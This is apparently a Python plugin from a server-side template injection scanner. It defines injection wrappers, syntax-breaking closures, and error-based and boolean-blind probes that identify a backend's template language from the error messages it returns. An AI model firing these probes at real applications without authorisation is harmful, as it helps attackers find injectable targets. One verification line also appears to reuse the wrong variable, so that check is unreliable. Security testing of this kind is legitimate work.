from core.plugin import Plugin
from utils import closures
from utils import rand
from utils.loggers import log


class Eval_generic(Plugin):
    # 避免 int 溢出
    header_length = 9
    header_type = "add"
    priority = 10
    plugin_info = {
        "Description": '具有标签评估功能的模板引擎',
        "Usage notes": '该插件是具有评估功能的检测SSTI的后备。\n不提供与操作系统相关的利用，语言评估直接在标签中进行。\n基于布尔错误的盲评估需要手动触发错误才能获得输出。\n您可以尝试检测模板引擎来搜索RCE负载。',
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",
        ]
    }

    def language_init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{header[0]}+{header[1]}',
                'trailer': '{trailer[0]}+{trailer[1]}',
                'test_render': f"{rand.randints[0]}+{rand.randints[1]}*{rand.randints[2]}",
                'test_render_expected': f'{rand.randints[0]+rand.randints[1]*rand.randints[2]}'
            },
            'render_error': {
                # 不实际渲染，只是注入 (1/0).zxy.zxy 并查找错误
                # 这都检查除以零、不存在的属性和未定义的属性
                'wrapper_type': "global",
                'render': '{code}',
                'header': '',
                'trailer': '',
                'test_render': f"({rand.randints[0]}/0).zxy.zxy",
                'test_render_expected': 'error',
                'test_render_verify': f'({rand.randints[0]}+{rand.randints[1]})*{rand.randints[2]}'
            },
            'boolean': {
                'call': 'inject',
                # 没有通用语法，因此使用语法错误
                'test_bool_true':  "(3*4/2)",
                'test_bool_false': "3*)2(/4",
                'verify_bool_true':  "((7*8)/(2*4))",
                'verify_bool_false': "7)(*)8)(2/(*4"
            },
            'evaluate': {
                'call': 'render',
                'evaluate': "{code}",
                'test_os': '"Unknown"',
                'test_os_expected': r'^Unknown$'
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': "{code}",
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0, 'wrappers': ["{code}", "{{{code}}}", "{{{{{code}}}}}", "#{{{code}}}", "@{{{code}}}",
                                      "*{{{code}}}", "{{={code}}}", "{{{{={code}}}}}", "\n={code}\n", "${{{code}}}",
                                      "<%={code}%>", "<?={code}?>", "@({code})"]},
            # TODO：评估代码上下文（全局包装器？）
            # {'级别'：1，'前缀'：'{closure}+'，'后缀'：'+{rclosure}'，'闭包'：ctx_closures}，
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["{{{code}}}"], 'suffix': '{1',
             'closures': ctx_closures},
            {'level': 2, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{{code}}}}}"], 'suffix': '{{1',
             'closures': ctx_closures},
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["${{{code}}}"], 'suffix': '${1',
             'closures': ctx_closures},
            {'level': 2, 'prefix': '{closure}%>', 'wrappers': ["<%={code}%>"], 'suffix': '<%=1',
             'closures': ctx_closures},
            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["#{{{code}}}"], 'suffix': '#{1',
             'closures': ctx_closures},
            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["{{={code}}}"], 'suffix': '{=1',
             'closures': ctx_closures},
            {'level': 3, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{={code}}}}}"], 'suffix': '{{=1',
             'closures': ctx_closures},
            {'level': 3, 'prefix': '{closure}\n', 'wrappers': ["\n={code}\n"], 'suffix': '\n=1',
             'closures': ctx_closures},
            {'level': 3, 'prefix': '{closure}%}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}",
                                                                "{{={code}}}", "{{{{={code}}}}}"], 'suffix': '{%1',
             'closures': ctx_closures},
            {'level': 4, 'prefix': '{closure}}}', 'wrappers': ["@{{{code}}}"], 'suffix': '@{1',
             'closures': ctx_closures},
            {'level': 4, 'prefix': '{closure}}}', 'wrappers': ["*{{{code}}}"], 'suffix': '*{1',
             'closures': ctx_closures},
            {'level': 4, 'prefix': '{closure}?>', 'wrappers': ["<?={code}?>"], 'suffix': '<?=1',
             'closures': ctx_closures},
            {'level': 4, 'prefix': '{closure})', 'wrappers': ["@({code})"], 'suffix': '@(1',
             'closures': ctx_closures},
            # Comments
            {'level': 5, 'prefix': '*}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}", "@{{{code}}}",
                                                       "#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}", "*{{{code}}}"],
             'suffix': '{*'},
            {'level': 5, 'prefix': '#}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}", "@{{{code}}}",
                                                       "#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}", "*{{{code}}}"],
             'suffix': '{#'},
        ])

    language = 'unknown'

    def _detect_render(self, reflection="render"):
        if reflection != "render_error":
            return super()._detect_render(reflection=reflection)
        render_action = self.actions.get("render_error")
        if not render_action:
            return
        true_render_action = self.actions.get("render")
        if not true_render_action:
            return
        # 打印要测试的内容
        log.log(23, f'{self.plugin} 插件正在测试基于错误的注入的反射')
        for prefix, suffix, wrapper in self._generate_contexts():
            payload = render_action.get('test_render')
            verify_payload = render_action.get('test_render_verify')
            wrapper_type = render_action.get(f'wrapper_type', 'local')
            header_rand = [rand.randint_n(10, 4), rand.randint_n(10, 4)]
            header = render_action.get('header')
            trailer_rand = [rand.randint_n(10, 4), rand.randint_n(10, 4)]
            trailer = render_action.get('trailer')
            discovered = False
            result = self.render(code=payload, header=header, trailer=trailer, header_rand=header_rand,
                                 trailer_rand=trailer_rand, prefix=prefix, suffix=suffix, wrapper=wrapper,
                                 wrapper_type=wrapper_type, error=True)
            resultl = result.lower()
            vresult = self.render(code=verify_payload, header=header, trailer=trailer, header_rand=header_rand,
                                  trailer_rand=trailer_rand, prefix=prefix, suffix=suffix, wrapper=wrapper,
                                  wrapper_type=wrapper_type, error=True)
            vresultl = result.lower()
            if "ZeroDivisionError" in result and "ZeroDivisionError" not in vresult:
                log.log(24, f'{self.plugin} 插件检测到 Python 错误消息的反射')
                discovered = True
                self.language = "python"
            elif "java.lang.ArithmeticException" in result and "java.lang.ArithmeticException" not in vresult:
                log.log(24, f'{self.plugin} 插件检测到 Java 错误消息的反射')
                discovered = True
                self.language = "java"
            elif "Arithmetic operation failed" in result and "Arithmetic operation failed" not in vresult:
                log.log(24, f'{self.plugin} 插件检测到 Freemarker (Java) 错误消息的反射')
                discovered = True
                self.language = "java"
            elif ("ReferenceError" in result and "ReferenceError" not in vresult) or \
                    ("TypeError" in result and "TypeError" not in vresult):
                log.log(24, f'{self.plugin} 插件检测到 JavaScript 错误消息的反射')
                discovered = True
                self.language = "javascript"
            elif ("Division by zero" in result and "Division by zero" not in vresult) or \
                    ("DivisionByZeroError" in result and "DivisionByZeroError" not in vresult):
                log.log(24, f'{self.plugin} 插件检测到可能反映 PHP 错误消息')
                discovered = True
                self.language = "php"
            elif "divided by 0" in result and "divided by 0" not in vresult:
                log.log(24, f'{self.plugin} 插件检测到可能反映 Ruby 错误消息')
                discovered = True
                self.language = "ruby"
            elif "divi" in resultl and ("0" in resultl or "zero" in resultl) and\
                    not ("divi" in vresultl and ("0" in vresultl or "zero" in vresultl)):
                log.log(24, f'{self.plugin} 插件检测到可能反映通用零除错误消息')
                discovered = True
            elif "function" in resultl and ("error" in resultl or "exception" in resultl or "unknown" in resultl) and \
                    not ("function" in vresultl and ("error" in vresultl or "exception" in vresultl or "unknown" in vresultl)):
                log.log(24, f'{self.plugin} 插件检测到可能反映通用未知函数错误消息')
                discovered = True
            elif "template" in resultl and ("error" in resultl or "exception" in resultl) and \
                    not ("template" in vresultl and ("error" in vresultl or "exception" in vresultl)):
                log.log(24, f'{self.plugin} 插件检测到可能反映通用模板错误消息')
                discovered = True
            if discovered:
                # 假设渲染具有相同的上下文
                self.set('render', true_render_action.get('render'))
                self.set('error', True)
                self.set('header', true_render_action.get('header'))
                self.set('trailer', true_render_action.get('trailer'))
                self.set('prefix', prefix)
                self.set('suffix', suffix)
                self.set('wrapper', wrapper)
                self.set('wrapper_type', true_render_action.get(f'wrapper_type', 'local'))
                self.channel.detected("render_error", {'expected': "Any error"})
                return


ctx_closures = {
    1: [
        closures.close_single_double_quotes + closures.integer + closures.empty,
        closures.close_function + closures.empty
    ],
    2: [
        closures.close_single_double_quotes + closures.integer + closures.string + closures.var + closures.empty,
        closures.close_function + closures.empty
    ],
    3: [
        closures.close_single_double_quotes + closures.integer + closures.string + closures.close_triple_quotes + closures.var + closures.empty,
        closures.close_function + closures.close_list + closures.close_dict + closures.empty
    ],
    4: [
        closures.close_single_double_quotes + closures.integer + closures.string + closures.close_triple_quotes + closures.var + closures.empty,
        closures.close_function + closures.close_list + closures.close_dict + closures.empty
    ],
    5: [
        closures.close_single_double_quotes + closures.integer + closures.string + closures.close_triple_quotes + closures.var + closures.empty,
        closures.close_function + closures.close_list + closures.close_dict + closures.empty,
        closures.close_function + closures.close_list + closures.empty,
        closures.if_loops + closures.empty
    ],
}
